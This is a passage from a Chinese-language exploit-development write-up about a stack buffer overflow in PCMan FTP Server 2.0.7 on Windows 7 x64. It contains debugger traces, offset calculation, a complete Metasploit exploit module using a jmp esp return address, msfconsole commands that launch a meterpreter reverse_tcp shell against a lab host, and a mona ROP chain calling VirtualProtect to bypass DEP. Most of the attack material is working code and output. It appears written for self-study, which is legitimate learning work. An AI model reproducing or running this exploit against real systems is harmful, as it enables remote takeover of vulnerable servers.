    执行到图od2中的004166e9处的retn时,0018ed5c和0018ed64处的返回地址都不变,继续f8跳到412967处,此时在wsock32.recv函数帧中,继续f8
    f8
    ..
    f8
    执行到412997处时,在到达这个函数帧中的rent语句前,所有的指令都在wsock32.recv函数帧中,0018ed5c中的返回地址由004029db被改成000000,也即wsock32.recv函数帧中的retn指令被执行时将返回到由004029db变成的00000000,此时栈帧已经被破坏,执行完wsock32.recv函数帧中的retn指令后,将跳到00000000执行,也即在当前帧(wsock32.recv函数帧)中执行到retn语句时,将发生错误,对应汇编指令为:

        00412976    5F              pop edi
        00412977    8A16            mov dl,byte ptr ds:[esi]
        00412979    B3 01           mov bl,0x1
        0041297B    0FB6CA          movzx ecx,dl

    对应堆栈窗口中0018ed5c和0018ed64处的内容为:

        0018ED58   00000000
        0018ED5C   00000000
        0018ED60   01D817A0
        0018ED64   004029EF  返回到 PCManFTP.004029EF 来自 PCManFTP.00412956
        0018ED68   0018ED78  ASCII &quot;LIST AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;...
        0018ED6C   01D80F80

    而当前函数帧中的retn语句在如下位置004129f9处:

        004129F1    F7D8            neg eax
        004129F3    1BC0            sbb eax,eax
        004129F5    23C3            and eax,ebx
        004129F7    5B              pop ebx
        004129F8    C9              leave
        004129F9    C3              retn

    所以如果是要将堆栈窗口中0018ed5c处的004029db或0018ed64处的004029ef这两个返回地址覆盖成41414141有极大的可能是在当前函数帧的004129f9处的retn语句前完成,而0018ed64处被覆盖成41414141的可能性更大,因为0018ed5c处已经被覆盖成00000000了

    f8
    f8
    ..
    f8
    在eip=004129f9前,单步执行到004129c1处
    f8
    f8
    ..
    f8执行到004129df,以jmp 到004129c1,也即004129c1到004129df相当于一个for循环,004129c1处开始到retn语句前的汇编指令如下:

        004129C1    8A02            mov al,byte ptr ds:[edx]
        004129C3    84C0            test al,al
        004129C5    74 1E           je short PCManFTP.004129E5
        004129C7    0FB6F0          movzx esi,al
        004129CA    8BCE            mov ecx,esi
        004129CC    6A 01           push 0x1
        004129CE    23CF            and ecx,edi                              ; PCManFTP.00439C18
        004129D0    58              pop eax                                  ; PCManFTP.00439C18
        004129D1    D3E0            shl eax,cl
        004129D3    C1EE 03         shr esi,0x3
        004129D6    8A4C35 E0       mov cl,byte ptr ss:[ebp+esi-0x20]
        004129DA    84C1            test cl,al
        004129DC    75 03           jnz short PCManFTP.004129E1
        004129DE    42              inc edx                                  ; ntdll_1a.7770B831
        004129DF  ^ EB E0           jmp short PCManFTP.004129C1
        004129E1    8022 00         and byte ptr ds:[edx],0x0
        004129E4    42              inc edx                                  ; ntdll_1a.7770B831
        004129E5    8B45 0C         mov eax,dword ptr ss:[ebp+0xC]
        004129E8    5F              pop edi                                  ; PCManFTP.00439C18
        004129E9    5E              pop esi                                  ; PCManFTP.00439C18
        004129EA    8950 18         mov dword ptr ds:[eax+0x18],edx          ; ntdll_1a.7770B831
        004129ED    8BC3            mov eax,ebx
        004129EF    2BC2            sub eax,edx                              ; ntdll_1a.7770B831
        004129F1    F7D8            neg eax
        004129F3    1BC0            sbb eax,eax
        004129F5    23C3            and eax,ebx
        004129F7    5B              pop ebx                                  ; PCManFTP.00439C18
        004129F8    C9              leave
        004129F9    C3              retn
    -----------------end------------------------

    直接在004129df的下一条语句004129e1上f4,发现f4以后eip直接跳到了00416685处的call getlasterror语句上,而不是f4执行到004129e1上,且f4以后0018ed5c处的004029db和0018ed64处的004029ef都被覆盖改写成41414141

    说明004129c1到004129df为关键的复制过程,这个过程覆盖了0018ed5c处的004029db和0018ed64处的004029ef

    然而在当前wsock32.recv函数帧中,如果覆盖返回地址,一般是只能覆盖到当前函数帧的上一函数帧的返回地址,即覆盖0018ed64处的004029ef,不明白为何连当前函数帧的返回地址也被覆盖成41414141了,这一点不解

    猜测是由于windows的消息机制,程序的主线程监视到有函数的返回地址被覆盖成不可执行的地址41414141时,进入异常处理链开始执行(由于主线程优先级高,于是出问题后不去41414141处执行,也不去原来wsock32.recv函数帧当中按f4处的004129e1执行),发现没有专门对应的exception handler,最后调用unhandled exceptionfilter(后来f8单步发现是有call unhandled exceptionfilter)处理这个异常,最后弹出图error的对话框,认为有某一刻eip=41414141,但是这一刻没有在单步调试中出现,认为由004129e1处突然跳到了call getlasterror的过程中,实际上是先到eip=41414141处,然后再跳到到call getlasterror处,或许是由于这个过程太快或比较特殊而没有被od捕捉到因而没有遇到eip=41414141的时刻

    但是现在不能确定是0018ed5c处被覆盖成的41414141还是0018ed64处被覆盖的41414141是真正的那一刻eip=41414141的时刻而引起的主线程优先进入异常处理

    理论上是在004129e1处f4的时候,由于还在wsock32.recv函数帧当中,返回的先后顺序是先返回到0018ed5c处被覆盖的41414141再返回到0018ed64处被覆盖的41414141,然而0018ed5c原来被覆盖成00000000时是可以理解的,被覆盖成41414141是不可理解的,于是这两种可能性都不能确定

    在内存中覆盖时AAAA的数据由0018e58e开始到0018ed64共2006个字节,由0018e58e开始到0018ed5c共1998个字节,重新发送1998xA+BBBB+CCCC+DDDD到pcmanftp,不用od加载,看看最后的error对话框中的异常位移是多少

    向pcmanftp发送Ax1998+Bx4+Cx4+Dx4发现不能使pcmanftp停止工作,于是发送Ax1998+Bx4+Cx4+Dx4+Ex6990(共9000个字节),成功使之停止工作,但是弹出对应error图中对话框中的异常偏移为45444444,也即对应EDDD,这样应该是说明是0018ed64处的41414141被覆盖,但是又相差一个字节,不知是那里算错了,暂且不纠结于此
    
    发送Ax1998+Bx4+Cx4+Dx4+F+Ex6989(共9000个字节),成功使之停止工作,且异常偏移显示为46444444,说明发送的9000个字节中,第2008到2011个字节处为覆盖eip处,构造exploit,发现与https://www.exploit-db.com/exploits/39662/链接中的偏移情况相同,都是在第2008-2011个字节处为覆盖返回地址的eip处,在这里填入jmp esp的地址后,再在后面填入用于反弹的shellcode即可,不同的是exploit-db中的是winxpsp3 eng环境,而此处环境为win7x64的中文系统环境
    
    在192.168.3.177中运行pcmanftp后od附加,alt+e选择一个系统dll(实验中选择的是c:\windows\system32\ntdll.dll),在od中ctrl+f:jmp esp找到一个地址为77506aeb,构造的exploit如下:

    -------------------------exploit.rb---------------------------------
    ##
    # This module requires Metasploit: http://metasploit.com/download
    # Current source: https://github.com/rapid7/metasploit-framework
    ##
    
    require &#39;msf/core&#39;
    
    class Metasploit3 &amp;lt; Msf::Exploit::Remote
      Rank = NormalRanking
    
      include Msf::Exploit::Remote::Ftp
    
      def initialize(info = {})
        super(update_info(info,
          &#39;Name&#39;           =&amp;gt; &#39;PCMAN FTP Server Buffer Overflow - PUT Command&#39;,
          &#39;Description&#39;    =&amp;gt; %q{
              This module exploits a buffer overflow vulnerability found in the PUT command of the
              PCMAN FTP v2.0.7 Server. This requires authentication but by default anonymous
              credientials are enabled.
          },
          &#39;Author&#39;         =&amp;gt;
              [
                &#39;quanyechavshuo&#39;
              ],
          &#39;License&#39;        =&amp;gt; MSF_LICENSE,
          &#39;References&#39;     =&amp;gt;
            [
              [ &#39;EDB&#39;,   &#39;37731&#39;],
              [ &#39;OSVDB&#39;,   &#39;94624&#39;]
            ],
          &#39;DefaultOptions&#39; =&amp;gt;
            {
              &#39;EXITFUNC&#39; =&amp;gt; &#39;process&#39;
            },
          &#39;Payload&#39;        =&amp;gt;
            {
              &#39;Space&#39;   =&amp;gt; 1000,
              &#39;BadChars&#39;  =&amp;gt; &quot;\x00\x0A\x0D&quot;,
            },
          &#39;Platform&#39;       =&amp;gt; &#39;win&#39;,
          &#39;Targets&#39;        =&amp;gt;
            [
              [ &#39;windows 7 x64&#39;,
                {
                  &#39;Ret&#39; =&amp;gt; 0x776c2fe1, # jmp esp C:\WINDOWS\system32\ntdll.dll
                  &#39;Offset&#39; =&amp;gt; 2008
                }
              ],
            ],
          &#39;DisclosureDate&#39; =&amp;gt; &#39;Aug 07 2015&#39;,
          &#39;DefaultTarget&#39;  =&amp;gt; 0))
      end
    
      def check
        connect_login
        disconnect
    
        if /220 PCMan&#39;s FTP Server 2\.0/ === banner
          Exploit::CheckCode::Appears
        else
          Exploit::CheckCode::Safe
        end
      end
    
    
      def exploit
        connect_login
    
        print_status(&#39;Generating payload...&#39;)
        sploit = rand_text_alpha(target[&#39;Offset&#39;])
    
        #tmp = sploit
        #print_status(tmp)
    
        sploit &amp;lt;&amp;lt; [target.ret].pack(&#39;V&#39;)
        sploit &amp;lt;&amp;lt; make_nops(16)
        sploit &amp;lt;&amp;lt; payload.encoded
    
        tmp=sploit
        print_status(tmp)
    
        send_cmd( [&quot;ls&quot;, sploit], false )
        disconnect
      end
    
    end
    ---------------------------end--------------------------------------

exploit情况说明:
    1.在实际msf中加载上面的exploit时,发现要应该对应第2009个字节开始为填充的jmp esp的地址,也即exploit代码中的填充随机覆盖的数据要有2008个,而不是原来认为的2007个
    2.出现1中的情况认为可能是考虑覆盖偏移量时不应该从AAAA开始,要从ls命令开始,也即ls AAAA开始算
    3.上面代码中没有发送共9000个字节的数据,用反弹的shellcode代替也可成功
    4.win7系统重启后,jmp esp地址会改变,重启后代码中的jmp esp的地址不再合适
    5.将上面的代码重命名为mypcmanftp.rb,放到kali中/usr/share/metasploit-framework/moudles/exploits/windows/my/目录下,使用如下命令:
            use exploit/windows/my/mypcmanftp
            set payload windows/meterpreter/reverse_tcp
            set rhost 192.168.3.177
            set lhost 192.168.3.106
            exploit
      成功溢出后返回meterpreter的shell如下图meterpreter1,其中打印出来的数据为代码中print_status(tmp)的结果,即payload的数据
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;图meterpreter1
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/meterpreter1.png&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;dep-on&quot;&gt;2&amp;gt;dep on&lt;/h4&gt;

&lt;p&gt;实验中win7x64系统中dep开启如下:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/dep_open_on_win7.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;参考
http://www.blogbus.com/riusksk-logs/80935313.html
http://drops.wooyun.org/papers/3602

目的
实现win7绕过dep并成功溢出pcmanftp

mona插件
    https://github.com/corelan/mona
    https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/
    https://huirong.github.io/2015/12/18/mona/
    http://www.cnphp6.com/archives/45078
    http://drops.wooyun.org/tips/6814

在immunity debugger中执行!mona rop -m *.dll -cp nonull,将得到如下(rop_chains.txt中)建议的rop_gadgets:

-------------rop_gadgets_from_mona____________
def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x027c9a7a,  # POP ECX # RETN [knb3rdhmpg.dll] 
      0x73c112d0,  # ptr to &amp;amp;VirtualProtect() [IAT OLEACC.dll]
      0x76969312,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [ole32.dll] 
      0x753c6833,  # XCHG EAX,ESI # RETN [KERNELBASE.dll] 
      0x76b5e6e8,  # POP EBP # RETN [msvcrt.dll] 
      0x74916f14,  # &amp;amp; push esp # ret  [RICHED20.dll]
      0x76b93866,  # POP EAX # RETN [msvcrt.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x76bb2fd0,  # NEG EAX # RETN [MSCTF.dll] 
      0x7727060d,  # XCHG EAX,EBX # RETN [OLEAUT32.DLL] 
      0x027f509d,  # POP EAX # RETN [knb3rdhmpg.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x717d1e67,  # NEG EAX # RETN [winrnr.dll] 
      0x753fd586,  # XCHG EAX,EDX # RETN [comdlg32.dll] 
      0x759e9941,  # POP ECX # RETN [SHELL32.dll] 
      0x7647d27c,  # &amp;amp;Writable location [USP10.dll]
      0x759d4aad,  # POP EDI # RETN [SHELL32.dll] 
      0x76cc4404,  # RETN (ROP NOP) [USER32.dll]
      0x7364681f,  # POP EAX # RETN [COMCTL32.dll] 
      0x90909090,  # nop
      0x772b73df,  # PUSHAD # RETN [OLEAUT32.DLL] 
    ].flatten.pack(&quot;V*&quot;)

    return rop_gadgets

  end
------------------end-------------------------

在pcmanftp中,重启系统后在上面的exploit.rb中将offset由2007改成2008,有可能是重启导致的一个字节的相差

mona中给出rop_gadgets只是参考的rop,并不代表一定可用,且最新v2版本似乎有点错误,mona算出的rop_gadgets中的第一个地址0x027c9a7a在od中ctrl+g查看一下发现不是对应pop ecx,retn的地址,且有一些地址是执行会产生问题的,这时需要结合od在实际情况中调试

实际调试中发现上面的第10个地址0x7727060d对应的XCHG EAX,EBX+retn在od中ctrl+g:7727060d确实是对应xchg eax,ebx+retn指令的,但是如果第10个地址用7727060d,在od跟踪pcmanftp(在402a26处下断,并f7,再f8,f8,...)中00402a26处的call 403e60后(402a26处的call 403e60汇编语句的下一句汇编语句的地址为402a2b,在上面dep off的实验中是堆栈窗口中的18ed64处的402a2b被改成jmp esp的地址)发现堆栈窗口中从18ed64处开始的对应的第10个地址会被改写,比较奇怪,认为是这个地址出了问题,从rop_suggestions.txt中找另外的XCHG EAX,EBX+RETN对应的地址代替后不会有这个问题

pcmanftp中的关键断点:
    00402a26处的call 403e60
        403e60函数帧里面的403ee6处的call 00412cbf
            412cbf函数帧里面的412ce8处的call 00416c5c

继续od跟踪看哪些地址还需修改

运行pcmanftp后od附加,在00402a26处下断,msf发送包含下面rop_gadgets的数据到192.168.3.177

------------------changing rop_gadgets--------------
   def create_rop_chain()
        rop_gadgets = 
        [
          0x778a45e1,  # POP ECX # RETN [knb3rdhmpg.dll] 
          0x73c112d0,  # ptr to &amp;amp;VirtualProtect() [IAT OLEACC.dll]
          0x76969312,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [ole32.dll] 
          0x753c6833,  # XCHG EAX,ESI # RETN [KERNELBASE.dll] 
          0x76b5e6e8,  # POP EBP # RETN [msvcrt.dll] 
          0x74916f14,  # &amp;amp; push esp # ret  [RICHED20.dll]
          0x76b93866,  # POP EAX # RETN [msvcrt.dll] 
          0xfffffdff,  # Value to negate, will become 0x00000201
          0x76bb2fd0,  # NEG EAX # RETN [MSCTF.dll] 
          0x756bd259,  # XCHG EAX,EBX # RETN [OLEAUT32.DLL] 
          0x74923ca7,  # POP EAX # RETN [knb3rdhmpg.dll] 
          0xffffffc0,  # Value to negate, will become 0x00000040
          0x76cc4402,  # NEG EAX # RETN [winrnr.dll] 
          0x753fd586,  # XCHG EAX,EDX # RETN [comdlg32.dll] 
          0x759e9941,  # POP ECX # RETN [SHELL32.dll] 
          0x7647d27c,  # &amp;amp;Writable location [USP10.dll]
          0x759d4aad,  # POP EDI # RETN [SHELL32.dll] 
          0x76cc4404,  # RETN (ROP NOP) [USER32.dll]
          0x7364681f,  # POP EAX # RETN [COMCTL32.dll] 
          0x90909090,  # nop
          0x772b73df,  # PUSHAD # RETN [OLEAUT32.DLL] 
        ].flatten.pack(&quot;V*&quot;)
        return rop_gadgets
      end
-----------------------end--------------------------

其中向192.168.3.177中pcmanftp发送的数据在下面的sploit变量中:

-----------------------sploit---------------------
     sploit = rand_text_alpha(target[&#39;Offset&#39;])
    
        #tmp = sploit
        #print_status(tmp)
        sploit &amp;lt;&amp;lt; create_rop_chain()
        sploit &amp;lt;&amp;lt; make_nops(30)
        sploit &amp;lt;&amp;lt; &quot;\xcc&quot;
        sploit &amp;lt;&amp;lt; payload.encoded
------------------------end-----------------------

在msf发送完数据时,要在od中ctrl+v---&amp;gt;t---&amp;gt;resume all threads,原因见上面dep off情况中的分析
resume all threads后,pcmanftp中断在00402a26,f9再运行到00402a26,此时开始处理sploit变量中的send_cmd( [&quot;ls&quot;, sploit], false ),第一次中断到402a26处为处理anonymous登录相关的字符串
此时汇编窗口中的数据如下所示,eip=402a26

    00402A26    E8 35140000     call PCManFTP.00403E60
    00402A2B    8A46 03         mov al,byte ptr ds:[esi+0x3]
    00402A2E    84C0            test al,al
    00402A30    75 04           jnz short PCManFTP.00402A36
    00402A32    C646 03 20      mov byte ptr ds:[esi+0x3],0x20
    00402A36    56              push esi
    00402A37    8BCD            mov ecx,ebp
    00402A39    E8 22000000     call PCManFTP.00402A60
    00402A3E    68 DC114400     push PCManFTP.004411DC                   ; ASCII &quot;
    &quot;
    00402A43    6A 00           push 0x0
    00402A45    E8 0CFF0000     call PCManFTP.00412956
    00402A4A    8BF0            mov esi,eax
    00402A4C    83C4 08         add esp,0x8
    00402A4F    85F6            test esi,esi
    00402A51  ^ 75 A6           jnz short PCManFTP.004029F9
    00402A53    5F              pop edi                                  ; 0018ED78
    00402A54    5E              pop esi                                  ; 0018ED78
    00402A55    5D              pop ebp                                  ; 0018ED78
    00402A56    81C4 04100000   add esp,0x1004
    00402A5C    C2 0400         retn 0x4

此时堆栈中18ed64处的返回地址还没有被覆盖,如下所示:

    0018ED5C   00000000
    0018ED60   00000000
    0018ED64   00402A05  PCManFTP.00402A05
    0018ED68   0018ED78  ASCII &quot;LS XnVkIvmqpcmSqSVEClMqFIHQzEBjHrHLdzEnDtwxDnbcqTqseEHLARmjMQrGaiNEnQpxxbUisIZaqPwjoePQmmCPMzhAZDIhYffDXdhLCrWCyhuidqcfuMFhMZecDDopTpMGWcQShqwfgLoDFfnSHbUvoEMVuDLiFEYfaTFfCAAoDuwasvaujuFloUrmoYzyyWqkvXOxkMBqUsTwpPZkbQalYgrryMvEeYywOCAiJv&quot;...
    0018ED6C   00000402
    0018ED70   00000000

其中0018ed5c处的返回地址已经被覆盖成00000000,18ed68处的的指针对应的是msf中的sploit变量的数据
od中f7进入403e60函数帧:

    00403E60    A1 40354400     mov eax,dword ptr ds:[0x443540]
    00403E65    81EC 14080000   sub esp,0x814
    00403E6B    85C0            test eax,eax
    00403E6D    56              push esi
    00403E6E    57              push edi
    00403E6F    8BF1            mov esi,ecx
    00403E71    75 0D           jnz short PCManFTP.00403E80
    00403E73    A1 48354400     mov eax,dword ptr ds:[0x443548]
    00403E78    85C0            test eax,eax
    00403E7A    0F84 31010000   je PCManFTP.00403FB1
    00403E80    8D4424 08       lea eax,dword ptr ss:[esp+0x8]
    00403E84    50              push eax
    00403E85    FF15 A8524300   call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.GetLocalTi&amp;gt;; kernel32.GetLocalTime
    00403E8B    8B46 24         mov eax,dword ptr ds:[esi+0x24]
    00403E8E    85C0            test eax,eax
    00403E90    74 05           je short PCManFTP.00403E97
    00403E92    8B40 08         mov eax,dword ptr ds:[eax+0x8]
    00403E95    EB 03           jmp short PCManFTP.00403E9A
    00403E97    8B46 04         mov eax,dword ptr ds:[esi+0x4]
    00403E9A    8BBC24 20080000 mov edi,dword ptr ss:[esp+0x820]
    00403EA1    8B5424 12       mov edx,dword ptr ss:[esp+0x12]
    00403EA5    8B4E 0C         mov ecx,dword ptr ds:[esi+0xC]
    00403EA8    57              push edi
    00403EA9    50              push eax
    00403EAA    8B4424 18       mov eax,dword ptr ss:[esp+0x18]
    00403EAE    81E2 FFFF0000   and edx,0xFFFF
    00403EB4    51              push ecx
    00403EB5    8B4C24 1A       mov ecx,dword ptr ss:[esp+0x1A]
    00403EB9    25 FFFF0000     and eax,0xFFFF
    00403EBE    52              push edx
    00403EBF    8B5424 1A       mov edx,dword ptr ss:[esp+0x1A]
    00403EC3    50              push eax
    00403EC4    8B4424 1C       mov eax,dword ptr ss:[esp+0x1C]
    00403EC8    81E1 FFFF0000   and ecx,0xFFFF
    00403ECE    81E2 FFFF0000   and edx,0xFFFF
    00403ED4    51              push ecx
    00403ED5    25 FFFF0000     and eax,0xFFFF
    00403EDA    52              push edx
    00403EDB    50              push eax
    00403EDC    8D4C24 3C       lea ecx,dword ptr ss:[esp+0x3C]
    00403EE0    68 D4164400     push PCManFTP.004416D4                   ; ASCII &quot;%d/%d/%d [%02d:%02d] (%05d) %s&amp;gt; %s
    &quot;
    00403EE5    51              push ecx
    00403EE6    E8 D4ED0000     call PCManFTP.00412CBF
    00403EEB    8B0D 14354400   mov ecx,dword ptr ds:[0x443514]
    00403EF1    83C4 28         add esp,0x28
    00403EF4    83F9 FF         cmp ecx,-0x1
    00403EF7    74 14           je short PCManFTP.00403F0D
    00403EF9    8D5424 18       lea edx,dword ptr ss:[esp+0x18]
    00403EFD    6A 00           push 0x0
    00403EFF    52              push edx
    00403F00    50              push eax
    00403F01    8D4424 28       lea eax,dword ptr ss:[esp+0x28]
    00403F05    50              push eax
    00403F06    51              push ecx
    00403F07    FF15 C8524300   call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.WriteFile&amp;gt;&amp;gt;; kernel32.WriteFile
    00403F0D    A1 48354400     mov eax,dword ptr ds:[0x443548]
    00403F12    85C0            test eax,eax
    00403F14    0F84 97000000   je PCManFTP.00403FB1
    00403F1A    E8 1FCC0100     call PCManFTP.00420B3E
    00403F1F    85C0            test eax,eax
    00403F21    0F84 8A000000   je PCManFTP.00403FB1
    00403F27    8B10            mov edx,dword ptr ds:[eax]
    00403F29    8BC8            mov ecx,eax
    00403F2B    FF52 74         call dword ptr ds:[edx+0x74]
    00403F2E    85C0            test eax,eax
    00403F30    74 7F           je short PCManFTP.00403FB1
    00403F32    0FBE07          movsx eax,byte ptr ds:[edi]
    00403F35    50              push eax
    00403F36    E8 25EF0000     call PCManFTP.00412E60
    00403F3B    83C4 04         add esp,0x4
    00403F3E    85C0            test eax,eax
    00403F40    74 4A           je short PCManFTP.00403F8C
    00403F42    E8 F7CB0100     call PCManFTP.00420B3E
    00403F47    85C0            test eax,eax
    00403F49    74 23           je short PCManFTP.00403F6E
    00403F4B    8B10            mov edx,dword ptr ds:[eax]
    00403F4D    8BC8            mov ecx,eax
    00403F4F    FF52 74         call dword ptr ds:[edx+0x74]
    00403F52    8D4C24 1C       lea ecx,dword ptr ss:[esp+0x1C]
    00403F56    51              push ecx
    00403F57    68 00800000     push 0x8000
    00403F5C    8BC8            mov ecx,eax
    00403F5E    E8 8D5D0000     call PCManFTP.00409CF0
    00403F63    5F              pop edi                                  ; PCManFTP.00402A2B
    00403F64    5E              pop esi                                  ; PCManFTP.00402A2B
    00403F65    81C4 14080000   add esp,0x814
    00403F6B    C2 0400         retn 0x4

一直f8到上面403ee6处的call 00412cbf,暂时不跟进,再按f8之后将完成18ed64处的返回地址被覆盖
f8后18ed64处的覆盖内容如下:
    
    0018ED5C   564F514E  #此时此处的原来被覆盖成00000000的wsock.revc函数的返回地址被覆盖成另外的值
    0018ED60   6475586A
    0018ED64   778A45E1  返回到 ntdll_12.778A45E1 来自 ntdll_12.DbgPrint
    0018ED68   73C112D0  &amp;lt;&amp;amp;KERNEL32.VirtualProtect&amp;gt;
    0018ED6C   76969312  ole32.76969312
    0018ED70   753C6833  返回到 KernelBa.753C6833
    0018ED74   76B5E6E8  msvcrt.76B5E6E8
    0018ED78   74916F14  riched20.74916F14
    0018ED7C   76B93866  msvcrt.76B93866
    0018ED80   FFFFFDFF
    0018ED84   76BB2FD0  msctf.76BB2FD0
    0018ED88   756BD259  shell32.756BD259
    0018ED8C   74923CA7  riched20.74923CA7
    0018ED90   FFFFFFC0
    0018ED94   76CC4402  user32.76CC4402
    0018ED98   753FD586  comdlg32.753FD586
    0018ED9C   759E9941  返回到 shell32.759E9941 来自 shell32.756DC254
    0018EDA0   7647D27C  usp10.7647D27C
    0018EDA4   759D4AAD  shell32.759D4AAD
    0018EDA8   76CC4404  user32.76CC4404
    0018EDAC   7364681F  comctl32.7364681F
    0018EDB0   90909090
    0018EDB4   772B73DF  oleaut32.772B73DF
    0018EDB8   939F4848
    0018EDBC   3F9BD691
    0018EDC0   4E274E37
    0018EDC4   D6439937
    0018EDC8   4B484393
    0018EDCC   91FDF948
    0018EDD0   479FFC4E
    0018EDD4   F8CC4691

其中rop_gadgets数据已经完全和发送的一样,而rop_gadgets后0018edb8处开始到0018edd5原来应该是30个nop+&quot;\xcc&quot;,其中的30个nop数据不是nop数据了,&quot;\xcc&quot;没变

在od中ctrl+f9运行到retn,然后再f8,此时eip=rop_gadgets中第一个数据,然后再f8..f8看看哪里会出问题

f8跟踪到0018edb4处的772b73df,772b73df中的指令为pushad retn,可想,执行完pushad后esp就上移了,这样再retn的话retn到的便不是rop_gadgets中的原来的应该是30个nop处的地方(现在被改写了,不再是30个nop)

觉得是mona的错误,不应该在最后加个poshad+retn的地址,将rop_gadgets中最后的pushad+retn的地址删除后再重新发送sploit数据并跟踪到rop_gadgets中第一个数据,然后再f8..f8看看哪里会出问题

再次进入到rop_gadgets中的第一个地址778a45e1处,此时eip=778a45e1,堆栈窗口中的18ed64处的数据为:

    0018ED64   778A45E1  ntdll_12.778A45E1
    0018ED68   73C112D0  &amp;lt;&amp;amp;KERNEL32.VirtualProtect&amp;gt;
    0018ED6C   76969312  ole32.76969312
    0018ED70   753C6833  返回到 KernelBa.753C6833
    0018ED74   76B5E6E8  msvcrt.76B5E6E8
    0018ED78   74916F14  riched20.74916F14
    0018ED7C   76B93866  msvcrt.76B93866
    0018ED80   FFFFFDFF
    0018ED84   76BB2FD0  msctf.76BB2FD0
    0018ED88   756BD259  shell32.756BD259
    0018ED8C   74923CA7  riched20.74923CA7
    0018ED90   FFFFFFC0
    0018ED94   76CC4402  user32.76CC4402
    0018ED98   753FD586  comdlg32.753FD586
    0018ED9C   759E9941  返回到 shell32.759E9941 来自 shell32.756DC254
    0018EDA0   7647D27C  usp10.7647D27C
    0018EDA4   759D4AAD  shell32.759D4AAD
    0018EDA8   76CC4404  user32.76CC4404
    0018EDAC   7364681F  comctl32.7364681F
    0018EDB0   90909090
    0018EDB4   4A4E96F5
    0018EDB8   4841F59B
    0018EDBC   48FD4B99
    0018EDC0   93909899
    0018EDC4   93989B4F
    0018EDC8   904242F9
    0018EDCC   98379648
    0018EDD0   90CC2797

对比观察发现rop_gadgets中的地址还没开始执行(eip=778a45e1)时,后面的rop_gadgets数据不变,但是后面30个nop还是被改成其他数据,尝试将后面的30个nop改成41414141...再次跟踪到eip=rop_gadgets中的第一个地址778a45e1时,堆栈窗口中的数据如下:

    0018ED64   778A45E1  ntdll_12.778A45E1
    0018ED68   73C112D0  &amp;lt;&amp;amp;KERNEL32.VirtualProtect&amp;gt;
    0018ED6C   76969312  ole32.76969312
    0018ED70   753C6833  返回到 KernelBa.753C6833
    0018ED74   76B5E6E8  msvcrt.76B5E6E8
    0018ED78   74916F14  riched20.74916F14
    0018ED7C   76B93866  msvcrt.76B93866
    0018ED80   FFFFFDFF
    0018ED84   76BB2FD0  msctf.76BB2FD0
    0018ED88   756BD259  shell32.756BD259
    0018ED8C   74923CA7  riched20.74923CA7
    0018ED90   FFFFFFC0
    0018ED94   76CC4402  user32.76CC4402
    0018ED98   753FD586  comdlg32.753FD586
    0018ED9C   759E9941  返回到 shell32.759E9941 来自 shell32.756DC254
    0018EDA0   7647D27C  usp10.7647D27C
    0018EDA4   759D4AAD  shell32.759D4AAD
    0018EDA8   76CC4404  user32.76CC4404
    0018EDAC   7364681F  comctl32.7364681F
    0018EDB0   90909090
    0018EDB4   41414141
    0018EDB8   41414141
    0018EDBC   41414141
    0018EDC0   41414141
    0018EDC4   41414141
    0018EDC8   41414141
    0018EDCC   41414141
    0018EDD0   4FCC4141

发现这时后面的30个41还是正常的没有被改变的,这样说明应该是win7x64位系统下开户dep后,栈中覆盖好的nop串会被改变成其他随机的填充数据,也有可能是nop串太长为30个时才会这样,考虑到上一篇文中

http://3xp10it.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%85%A5%E9%97%A8-%E5%8A%A8%E6%80%81%E8%B7%9F%E8%B8%AA%E6%BA%90%E4%BB%A3%E7%A0%81%E5%92%8C%E5%8F%8D%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81/

提到msf的payload前面有可能需要至少9个nop空间帮助完成payload的解码等工作,将30个nop改成9个nop试试9个nop会不会被改成随机的填充数据

再次重新跟踪到eip=rop_gadgets中的第一个地址时,18ed64处的数据为:

    0018ED64   778A45E1  ntdll_12.778A45E1
    0018ED68   73C112D0  &amp;lt;&amp;amp;KERNEL32.VirtualProtect&amp;gt;
    0018ED6C   76969312  ole32.76969312
    0018ED70   753C6833  返回到 KernelBa.753C6833
    0018ED74   76B5E6E8  msvcrt.76B5E6E8
    0018ED78   74916F14  riched20.74916F14
    0018ED7C   76B93866  msvcrt.76B93866
    0018ED80   FFFFFDFF
    0018ED84   76BB2FD0  msctf.76BB2FD0
    0018ED88   756BD259  shell32.756BD259
    0018ED8C   74923CA7  riched20.74923CA7
    0018ED90   FFFFFFC0
    0018ED94   76CC4402  user32.76CC4402
    0018ED98   753FD586  comdlg32.753FD586
    0018ED9C   759E9941  返回到 shell32.759E9941 来自 shell32.756DC254
    0018EDA0   7647D27C  usp10.7647D27C
    0018EDA4   759D4AAD  shell32.759D4AAD
    0018EDA8   76CC4404  user32.76CC4404
    0018EDAC   7364681F  comctl32.7364681F
    0018EDB0   90909090
    0018EDB4   4E43F842
    0018EDB8   D64348F9
    0018EDBC   4B46CCFD

